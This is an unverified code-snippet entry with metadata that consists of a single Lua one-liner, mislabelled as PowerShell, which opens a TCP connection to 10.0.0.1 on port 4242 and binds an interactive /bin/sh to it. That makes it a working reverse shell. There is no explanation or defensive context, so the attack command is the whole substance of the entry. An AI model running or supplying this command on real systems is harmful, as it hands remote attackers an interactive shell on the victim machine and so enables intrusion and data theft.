---
id: 6e07e01a-3b59-4102-be7a-1f11a391b7b9
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:24.651775+00:00'
updated_at: '2023-04-10T20:25:24.219488+00:00'
---

# Code Snippet 6e07e01a

**Language**: Powershell

```powershell
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```


